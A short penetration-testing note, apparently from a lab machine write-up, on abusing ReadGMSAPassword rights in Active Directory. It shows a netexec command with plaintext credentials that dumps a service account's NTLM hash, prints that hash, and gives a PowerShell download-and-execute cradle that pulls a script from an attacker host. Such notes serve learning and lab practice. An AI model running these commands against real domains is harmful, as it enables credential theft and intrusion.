# Intelligence - ReadGMSAPassword

## ReadGMSAPassword

In BloodHound, Ted.Graves has ReadGMSAPassword rights. This allows reading the Group Managed Service Account (GMSA) password for svc_int$.

## Step 1: Using LDAPS

```bash
nxc ldap 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy' --gmsa
```

Account: svc_int$ NTLM: b8159389d3528c4b1079ae461f28eb69

## Step 2: GMSAPasswordReader.ps1 (without LDAPS)

```bash
iex(new-object net.webclient).downloadstring('http://192.168.45.241:81/GMSAPasswordReader.ps1')

Invoke-GMSAPasswordReader -Command "--AccountName SVC_APACHE"
```

[image]
